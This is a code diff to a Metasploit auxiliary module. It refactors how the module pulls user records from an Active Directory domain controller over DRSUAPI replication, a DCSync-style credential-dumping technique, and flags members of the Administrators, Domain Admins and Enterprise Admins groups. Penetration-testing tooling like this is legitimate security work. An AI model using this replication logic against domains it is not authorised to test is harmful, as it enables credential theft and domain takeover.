@@ -891,7 +891,7 @@ class MetasploitModule < Msf::Auxiliary
       )
       return
     end
-    specific_users = datastore['KRB_USERS'].strip.split(',')
+    specific_users = datastore['KRB_USERS'].strip.split(',').map { |s| s.strip }
 
     if specific_users.empty?
       users = get_domain_users
@@ -902,6 +902,8 @@ class MetasploitModule < Msf::Auxiliary
 
       users = get_domain_users_by_name(specific_users)
     end
+
+    sids = Set.new(users.map {|sid_and_user| sid_and_user[0]})
 
     dcerpc_client = connect_drs
     unless dcerpc_client
@@ -914,29 +916,27 @@ class MetasploitModule < Msf::Auxiliary
     ph_drs = dcerpc_client.drs_bind
     dc_infos = dcerpc_client.drs_domain_controller_info(ph_drs, domain_name)
     user_info = {}
-    dc_infos.each do |dc_info|
-      users.each do |user|
-        sid = user[0]
-        crack_names = dcerpc_client.drs_crack_names(ph_drs, rp_names: [sid])
-        crack_names.each do |crack_name|
-          user_record = dcerpc_client.drs_get_nc_changes(
-            ph_drs,
-            nc_guid: crack_name.p_name.to_s.encode('utf-8'),
-            dsa_object_guid: dc_info.ntds_dsa_object_guid
-          )
-          user_info[sid] = parse_user_record(dcerpc_client, user_record)
-        end
+    dc_info = dc_infos[0]
+    sids.each do |sid|
+      crack_names = dcerpc_client.drs_crack_names(ph_drs, rp_names: [sid])
+      crack_names.each do |crack_name|
+        user_record = dcerpc_client.drs_get_nc_changes(
+          ph_drs,
+          nc_guid: crack_name.p_name.to_s.encode('utf-8'),
+          dsa_object_guid: dc_info.ntds_dsa_object_guid
+        )
+        user_info[sid] = parse_user_record(dcerpc_client, user_record)
+      end
 
-        groups = get_user_groups(sid)
-        groups.each do |group|
-          case group.name
-          when 'BUILTIN\\Administrators'
-            user_info[sid][:admin] = true
-          when '(domain)\\Domain Admins'
-            user_info[sid][:domain_admin] = true
-          when '(domain)\\Enterprise Admins'
-            user_info[sid][:enterprise_admin] = true
-          end
+      groups = get_user_groups(sid)
+      groups.each do |group|
+        case group.name
+        when 'BUILTIN\\Administrators'
+          user_info[sid][:admin] = true
+        when '(domain)\\Domain Admins'
+          user_info[sid][:domain_admin] = true
+        when '(domain)\\Enterprise Admins'
+          user_info[sid][:enterprise_admin] = true
         end
       end
     end
